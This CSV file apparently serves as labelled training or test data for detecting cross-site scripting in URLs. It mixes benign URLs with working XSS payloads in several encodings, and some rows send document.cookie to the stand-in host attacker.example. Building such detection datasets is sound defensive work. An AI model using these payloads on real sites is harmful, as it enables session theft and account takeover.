url,payload,carrier,param_name,encoded,notes,label
"https://webapp.local/search?redirect=<img src=1 onerror=alert(String.fromCharCode(88,83,83))>&ref=0","<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,redirect,raw,img_onerror_obf,1
https://demo.example.org/search?callback=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D,{{constructor.constructor('alert(1)')()}},query,callback,urlencoded,template_injection,1
https://demo.example.org/api?callback=user-x&id=1&page=0,user-x,callback,s,raw,benign,0
https://portal.example.net/search?callback=&lt;math&gt;&lt;mi&gt;&lt;/mi&gt;&lt;mfrac&gt;&lt;mn&gt;&lt;/mn&gt;&lt;/mfrac&gt;&lt;/math&gt;&lt;script&gt;alert(1)&lt;/script&gt;,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,callback,html_entity,script_in_math,1
https://service.test/user/prices/profile,prices,path,,raw,benign,0
https://blog.example/search?session=news,news,query,session,raw,benign,0
https://webapp.local/search?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&page=newsletter,<script>alert(1)</script>,query,name,urlencoded,script_tag,1
https://example.com/search?name=%3Cmath%3E%3Cmi%3E%3C%2Fmi%3E%3Cmfrac%3E%3Cmn%3E%3C%2Fmn%3E%3C%2Fmfrac%3E%3C%2Fmath%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,name,urlencoded,script_in_math,1
https://blog.example/search?name=signup&ref=google,signup,query,name,raw,benign,0
https://webapp.local/search?term=javascript%3Aalert%281%29,javascript:alert(1),query,term,urlencoded,js_uri,1
https://testsite.local/search?utm_source=blog&source=newsletter,blog,query,utm_source,raw,benign,0
https://example.com/search?name=<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>&lang=google,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,query,name,raw,cookie_exfil,1
https://vulnerable.app/redirect?url=https://victim.example/?p=%3Cimg%20src%3D1%20onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",redirect,msg,urlencoded,img_onerror_obf,1
https://demo.example.org/search?search=<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,query,search,raw,cookie_exfil,1
https://mysite.example/search?ref=article&ref=0,article,query,ref,raw,benign,0
https://webapp.local/redirect?url=https://victim.example/?p=contact&source=0,contact,redirect,callback,raw,benign,0
https://mysite.example/search?input=news&page=affiliate,news,query,input,raw,benign,0
https://webapp.local/search?page=home46874,home46874,query,page,raw,benign,0
"https://demo.example.org/search?redirect=""><svg onload=alert(1)>","""><svg onload=alert(1)>",query,redirect,raw,attribute_breakout_svg,1
https://service.test/search?s=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&session=google,<script>alert(1)</script>,query,s,urlencoded,script_tag,1
"https://portal.example.net/search?tmpl=<img src=1 onerror=alert(String.fromCharCode(88,83,83))>&ref=xyz","<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,tmpl,raw,img_onerror_obf,1
https://portal.example.net/search?utm_source=index,index,query,utm_source,raw,benign,0
https://shop.example/user/%2527%2529%253Beval%2528String.fromCharCode%252897%252C108%252C101%252C114%252C116%252C40%252C49%252C41%2529%2529%252F%252F/profile,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",path,,double_urlencoded,eval_obf,1
https://catalog.example/search?ref=cart,cart,query,ref,raw,benign,0
https://portal.example.net/page#en,en,fragment,,raw,benign,0
https://catalog.example/api?callback=42&id=1,42,callback,view,raw,benign,0
https://portal.example.net/search?input=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,"""><img src=x onerror=alert(1)>",query,input,mixed,attribute_breakout_img,1
https://shop.example/search?s=welcome,welcome,query,s,raw,benign,0
https://portal.example.net/api?callback=%3Cimg%20src%3D1%20onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E&id=1,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",callback,callback,urlencoded,img_onerror_obf,1
https://portal.example.net/search?q=1,1,query,q,raw,benign,0
https://service.test/search?msg=cart,cart,query,msg,raw,benign,0
https://mysite.example/search?file=1&utm_source=google,1,query,file,raw,benign,0
https://webapp.local/search?tmpl={{constructor.constructor(&#x27;alert(1)&#x27;)()}}&page=0,{{constructor.constructor('alert(1)')()}},query,tmpl,html_entity,template_injection,1
https://shop.example/search?redirect=%253Cmeta%2520http-equiv%253D%2527refresh%2527%2520content%253D%25270%253Burl%253Djavascript%253Aalert%25281%2529%2527%253E,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,redirect,double_urlencoded,meta_refresh_js_uri,1
https://service.test/search?term=user,user,query,term,raw,benign,0
https://demo.example.org/api?callback=en&id=1&source=0,en,callback,query,raw,benign,0
"https://portal.example.net/redirect?url=https://victim.example/?p=&lt;img src=1 onerror=alert(String.fromCharCode(88,83,83))&gt;","<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",redirect,q,html_entity,img_onerror_obf,1
https://testsite.local/search?view=%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C%2Fdesc%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fsvg%3E&page=en,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,view,urlencoded,svg_cdata_script,1
https://testsite.local/search?s=about-ref&utm_source=en,about-ref,query,s,raw,benign,0
https://webapp.local/search?url=checkout,checkout,query,url,raw,benign,0
"https://example.com/redirect?url=https://victim.example/?p=""><video><source onerror=alert(1)></video>","""><video><source onerror=alert(1)></video>",redirect,id,raw,attribute_breakout_video,1
https://example.com/search?name=<script>alert(1)</script>,<script>alert(1)</script>,query,name,raw,script_tag,1
https://vulnerable.app/search?tmpl=&quot;&gt;&lt;svg onload=alert(1)&gt;,"""><svg onload=alert(1)>",query,tmpl,html_entity,attribute_breakout_svg,1
https://webapp.local/search?search=1,1,query,search,raw,benign,0
https://shop.example/page#<iframe src='javascript:alert(1)'></iframe>,<iframe src='javascript:alert(1)'></iframe>,fragment,,raw,iframe_js_uri,1
https://webapp.local/search?s=blog&session=en,blog,query,s,raw,benign,0
https://blog.example/user/cart/profile,cart,path,,raw,benign,0
https://demo.example.org/search?s=item,item,query,s,raw,benign,0
https://demo.example.org/page#1-x,1-x,fragment,,raw,benign,0
https://blog.example/redirect?url=https://victim.example/?p=about,about,redirect,utm_source,raw,benign,0
https://sErvice.tesT/user/<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>/profile,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,path,,raw,cookie_exfil,1
https://blog.example/search?lang=order&page=affiliate,order,query,lang,raw,benign,0
https://portal.example.net/redirect?url=https://victim.example/?p=%22%3E%3Csvg%20onload%3Dalert%281%29%3E,"""><svg onload=alert(1)>",redirect,url,urlencoded,attribute_breakout_svg,1
https://blog.example/search?file=profile-info,profile-info,query,file,raw,benign,0
https://testsite.local/search?term=checkout,checkout,query,term,raw,benign,0
https://webapp.local/search?name=2025-10-01&source=newsletter,2025-10-01,query,name,raw,benign,0
https://shop.example/redirect?url=https://victim.example/?p=%253Cscript%253Ealert%281%29%253C%2Fscript%253E&page=1,%3Cscript%3Ealert(1)%3C/script%3E,redirect,msg,urlencoded,already_encoded,1
https://catalog.example/search?file=order,order,query,file,raw,benign,0
https://demo.example.org/redirect?url=https://victim.example/?p=item,item,redirect,lang,raw,benign,0
https://mysite.example/api?callback=article&id=1,article,callback,input,raw,benign,0
https://demo.example.org/search?redirect=login57984,login57984,query,redirect,raw,benign,0
https://testsite.local/user/%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D/profile,{{constructor.constructor('alert(1)')()}},path,,urlencoded,template_injection,1
https://demo.example.org/search?callback=checkout,checkout,query,callback,raw,benign,0
https://demo.example.org/api?callback=%27%29%3Bdocument.location%3D%27javascript%3Aalert%281%29%27%2F%2F&id=1,');document.location='javascript:alert(1)'//,callback,callback,urlencoded,document_location_js,1
"https://Example.Com/page#<img src=1 onerror=alert(String.fromCharCode(88,83,83))>","<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",fragment,,raw,img_onerror_obf,1
https://shop.example/search?q=checkout&utm_source=organic,checkout,query,q,raw,benign,0
https://blog.example/search?name=42&page=en,42,query,name,raw,benign,0
https://example.com/search?s=1-new,1-new,query,s,raw,benign,0
https://webapp.local/search?term=<body onload=alert(1)>,<body onload=alert(1)>,query,term,raw,body_onload,1
https://catalog.example/search?view=blog,blog,query,view,raw,benign,0
https://testsite.local/search?term=42&utm_source=affiliate,42,query,term,raw,benign,0
https://example.com/search?input=1,1,query,input,raw,benign,0
https://demo.example.org/search?msg=%3Cmath%3E%3Cmi%3E%3C%2Fmi%3E%3Cmfrac%3E%3Cmn%3E%3C%2Fmn%3E%3C%2Fmfrac%3E%3C%2Fmath%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&lang=0,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,msg,urlencoded,script_in_math,1
https://service.test/search?query=item-2025,item-2025,query,query,raw,benign,0
https://demo.example.org/search?name=cart-2025&page=1,cart-2025,query,name,raw,benign,0
"https://shop.example/page#""><svg onload=alert(1)>","""><svg onload=alert(1)>",fragment,,raw,attribute_breakout_svg,1
https://demo.example.org/search?q=welcome,welcome,query,q,raw,benign,0
https://portal.example.net/search?view=item,item,query,view,raw,benign,0
https://demo.example.org/redirect?url=https://victim.example/?p=index,index,redirect,session,raw,benign,0
https://testsite.local/search?msg=category&utm_source=1,category,query,msg,raw,benign,0
https://portal.example.net/api?callback=user&id=1&ref=google,user,callback,search,raw,benign,0
https://portal.example.net/search?name=1,1,query,name,raw,benign,0
https://webapp.local/redirect?url=https://victim.example/?p=index,index,redirect,term,raw,benign,0
https://shop.example/page#test,test,fragment,,raw,benign,0
https://testsite.local/search?lang=user,user,query,lang,raw,benign,0
https://blog.example/search?callback=category,category,query,callback,raw,benign,0
https://shop.example/search?page=%27%29%3Bdocument.location%3D%27javascript%3Aalert%281%29%27%2F%2F&lang=xyz,');document.location='javascript:alert(1)'//,query,page,mixed,document_location_js,1
https://blog.example/redirect?url=https://victim.example/?p=index,index,redirect,s,raw,benign,0
https://mysite.example/search?query=order,order,query,query,raw,benign,0
https://webapp.local/user/checkout/profile,checkout,path,,raw,benign,0
https://testsite.local/search?s=&lt;iframe src=&#x27;javascript:alert(1)&#x27;&gt;&lt;/iframe&gt;&ref=0,<iframe src='javascript:alert(1)'></iframe>,query,s,html_entity,iframe_js_uri,1
https://catalog.example/search?view=product,product,query,view,raw,benign,0
https://vulnerable.app/page#%253Csvg%253E%253Cdesc%253E%253C%2521%255BCDATA%255B%253C%252Fdesc%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%255D%255D%253E%253C%252Fsvg%253E,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,fragment,,double_urlencoded,svg_cdata_script,1
https://blog.example/search?msg=news,news,query,msg,raw,benign,0
https://catalog.example/search?msg=product,product,query,msg,raw,benign,0
https://service.test/search?callback=blog&page=organic,blog,query,callback,raw,benign,0
https://shop.example/redirect?url=https://victim.example/?p=blog54707&lang=google,blog54707,redirect,search,raw,benign,0
https://demo.example.org/search?ref=news,news,query,ref,raw,benign,0
https://demo.example.org/search?input=%3Cmath%3E%3Cmi%3E%3C%2Fmi%3E%3Cmfrac%3E%3Cmn%3E%3C%2Fmn%3E%3C%2Fmfrac%3E%3C%2Fmath%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&lang=1,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,input,mixed,script_in_math,1
https://vulnerable.app/redirect?url=https://victim.example/?p=%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F&lang=newsletter,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",redirect,id,urlencoded,eval_obf,1
https://example.com/search?page=welcome,welcome,query,page,raw,benign,0
https://service.test/api?callback={{constructor.constructor('alert(1)')()}}&id=1,{{constructor.constructor('alert(1)')()}},callback,callback,raw,template_injection,1
https://catalog.example/redirect?url=https://victim.example/?p=home,home,redirect,q,raw,benign,0
https://example.com/search?file=<iframe src='javascript:alert(1)'></iframe>,<iframe src='javascript:alert(1)'></iframe>,query,file,raw,iframe_js_uri,1
https://demo.example.org/search?query=javascript%3Aalert%281%29&lang=en,javascript:alert(1),query,query,urlencoded,js_uri,1
https://webapp.local/api?callback=details&id=1&ref=newsletter,details,callback,query,raw,benign,0
https://testsite.local/api?callback=welcome&id=1&utm_source=1,welcome,callback,q,raw,benign,0
https://portal.example.net/search?utm_source=checkout,checkout,query,utm_source,raw,benign,0
https://testsite.local/api?callback=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D&id=1&lang=xyz,{{constructor.constructor('alert(1)')()}},callback,callback,urlencoded,template_injection,1
https://service.test/user/news/profile,news,path,,raw,benign,0
https://example.com/search?view=&lt;iframe src=&#x27;javascript:alert(1)&#x27;&gt;&lt;/iframe&gt;,<iframe src='javascript:alert(1)'></iframe>,query,view,html_entity,iframe_js_uri,1
https://testsite.local/redirect?url=https://victim.example/?p=en,en,redirect,q,raw,benign,0
https://catalog.example/search?lang=prices,prices,query,lang,raw,benign,0
https://testsite.local/search?s=%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C%2Fdesc%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fsvg%3E,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,s,urlencoded,svg_cdata_script,1
https://testsite.local/page#&lt;iframe src=&#x27;javascript:alert(1)&#x27;&gt;&lt;/iframe&gt;,<iframe src='javascript:alert(1)'></iframe>,fragment,,html_entity,iframe_js_uri,1
https://shop.example/user/item/profile,item,path,,raw,benign,0
https://shop.example/search?view=<script>alert(1)</script>&lang=google,<script>alert(1)</script>,query,view,raw,script_tag,1
https://shop.example/user/1/profile,1,path,,raw,benign,0
https://portal.example.net/redirect?url=https://victim.example/?p=&#x27;);alert(1);//&lang=xyz,');alert(1);//,redirect,search,html_entity,inline_js_snippet,1
https://portal.example.net/search?url=login,login,query,url,raw,benign,0
https://service.test/api?callback=article&id=1&source=0,article,callback,input,raw,benign,0
https://shop.example/api?callback=home&id=1&page=affiliate,home,callback,msg,raw,benign,0
https://example.com/user/%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E/profile,<iframe src='javascript:alert(1)'></iframe>,path,,mixed,iframe_js_uri,1
https://testsite.local/search?tmpl=%2527%2529%253Balert%25281%2529%253B%252F%252F,');alert(1);//,query,tmpl,double_urlencoded,inline_js_snippet,1
https://testsite.local/redirect?url=https://victim.example/?p=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D,{{constructor.constructor('alert(1)')()}},redirect,name,mixed,template_injection,1
